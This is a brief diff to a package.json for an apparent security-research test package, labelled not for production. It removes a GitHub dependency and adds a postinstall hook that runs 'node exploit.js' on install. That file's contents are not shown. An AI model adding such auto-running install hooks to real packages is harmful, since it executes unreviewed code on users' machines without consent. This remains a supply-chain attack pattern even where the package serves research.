@@ -3,9 +3,9 @@
   "version": "1.0.0",
   "description": "A test package - DO NOT USE IN PRODUCTION",
   "main": "index.js",
+  "scripts": {
+    "postinstall": "node exploit.js"
+  },
   "author": "Security Researcher",
-  "license": "MIT",
-  "dependencies": {
-    "test-hehe": "github:aannnguyen/test-hehe"
-  }
+  "license": "MIT"
 }
